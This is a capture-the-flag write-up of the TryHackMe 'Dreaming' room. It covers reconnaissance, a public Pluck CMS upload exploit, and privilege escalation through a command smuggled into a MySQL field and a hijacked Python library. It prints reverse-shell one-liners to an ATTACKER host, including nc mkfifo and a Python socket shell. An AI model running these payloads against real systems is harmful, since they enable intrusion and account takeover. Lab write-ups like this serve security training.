---
title: "Dreaming"
date: 2025-10-30
draft: false
summary: "Writeup for Dreaming CTF challenge on TryHackMe."
tags: ["linux", "sudo", "cron", "rce", "hardcoded creds"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/dreaming/cover.webp"
  caption: "Dreaming TryHackMe Challenge"
  alt: "Dreaming cover"
platform: "TryHackMe"
---

Solve the riddle that dreams have woven.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/dreaming

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and the services running on them.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN dreaming.nmap
```

![](https://cdn.ziomsec.com/dreaming/1.webp)

## Initial Foothold

The target only had **ssh** and **http** running, so I accessed the web server through my browser.

![](https://cdn.ziomsec.com/dreaming/2.webp)

The server had a default Apache landing page. So I fuzzed for hidden directories using **ffuf**.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![](https://cdn.ziomsec.com/dreaming/3.webp)

The endpoint had a directory listing.

![](https://cdn.ziomsec.com/dreaming/4.webp)

I used **searchsploit** to look for exploits related to the CMS and found an interesting exploit that could be used if I had some credentials.

```shell
searchsploit 'pluck 4.7.13'
```

![](https://cdn.ziomsec.com/dreaming/5.webp)

I clicked on *admin* and was prompted to log in.

![](https://cdn.ziomsec.com/dreaming/6.webp)

I tried using common passwords and logged in using *'password'*.

![](https://cdn.ziomsec.com/dreaming/7.webp)

After logging in, I downloaded the exploit on my local system and viewed it to understand its usage.

```shell
searchsploit -m 'php/webapps/49909.py'
```

The exploit required the target IP, port, password and path to the CMS.

![](https://cdn.ziomsec.com/dreaming/8.webp)

Hence I ran the exploit by giving it the required parameters.

```shell
python3 49909.py TARGET 80 'password' /app/pluck-4.7.13
```

![](https://cdn.ziomsec.com/dreaming/9.webp)

I accessed the uploaded shell through my browser. I then verified if the target had **netcat** and got a reverse shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER 80 >/tmp/f
```

![](https://cdn.ziomsec.com/dreaming/10.webp)

```shell
rlwrap nc -lnvp 80
```

![](https://cdn.ziomsec.com/dreaming/11.webp)

## Privilege Escalation

### Shell As Lucien

After getting a reverse shell, I viewed the number of users present in the system.

```shell
cat /etc/passwd | grep "bash"
```

Users:
1. root
2. lucien
3. death
4. morpheus
5. ubuntu

While exploring the file system, I found 2 python files that contained user credentials. The password of *death* was not visible but I found the password of another user called *lucien*.

![](https://cdn.ziomsec.com/dreaming/12.webp)

![](https://cdn.ziomsec.com/dreaming/13.webp)

I logged in as *lucien*.

```shell
ssh lucien@TARGET
```

![](https://cdn.ziomsec.com/dreaming/14.webp)

I then captured *lucien*'s flag.

![](https://cdn.ziomsec.com/dreaming/15.webp)

### Shell As Death

Listing **sudo** privileges revealed I was allowed to run a python script as the user *death*.

```shell
sudo -l
```

![](https://cdn.ziomsec.com/dreaming/16.webp)

I ran the script to see what it does.

```shell
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

![](https://cdn.ziomsec.com/dreaming/17.webp)

I had also found a script with the same name in the `/opt` directory. Examining the script revealed that there was a database named library that had a table that contained 2 columns. Both were printed on our terminal.

![](https://cdn.ziomsec.com/dreaming/18.webp)

*Lucien*'s bash history also had the **mysql** password.

![](https://cdn.ziomsec.com/dreaming/19.webp)

So I accessed the **mysql** server and viewed the table that was being used by the *getDreams.py* script.

```shell
mysql -u lucien -plucien42DBPASSWORD
> use library;
> select * from dreams;
```

![](https://cdn.ziomsec.com/dreaming/20.webp)

I wanted to substitute the value of the *dream* column with a command's execution. So I looked for ways I could do it on google. After finding a way to substitute values, I used a revshells script to get a reverse shell as the use *death*.
- https://www.revshells.com/

```shell
insert into dreams(dreamer,dream) values ("evil sr", "$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 80 >/tmp/f)");
```

![](https://cdn.ziomsec.com/dreaming/21.webp)

```shell
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

![](https://cdn.ziomsec.com/dreaming/22.webp)

![](https://cdn.ziomsec.com/dreaming/23.webp)

After getting a shell as *death*, I captured *death*'s flag.

![](https://cdn.ziomsec.com/dreaming/24.webp)

I then viewed the python script and found *death*'s password.

![](https://cdn.ziomsec.com/dreaming/25.webp)

### Shell As Morpheus

I now only needed to find the flag of morpheus. So I viewed that user's files and found a pythons script.

```shell
cat /home/morpheus/restore.py
```

![](https://cdn.ziomsec.com/dreaming/26.webp)

Since it was a python script that imported libraries, I looked for writable files inside the `/usr/` directory hoping to find something interesting and found I had write permissions on **shutil.py**.

```shell
find /usr/ -type f -writable 2>/dev/null
```

![](https://cdn.ziomsec.com/dreaming/27.webp)

I used a python reverse shell payload and replaced the contents of **shutil.py** with it. I then started a **netcat** listener.

```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATACKER",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > /usr/lib/python3.8/shutil.py
```

![](https://cdn.ziomsec.com/dreaming/28.webp)

After some time, I received a reverse shell.

```shell
rlwrap nc -lnvp 8080
```

![](https://cdn.ziomsec.com/dreaming/29.webp)

Finally, I captured *morpheus*'s flag

![](https://cdn.ziomsec.com/dreaming/30.webp)

That's it from my side!
Until next time :)

---
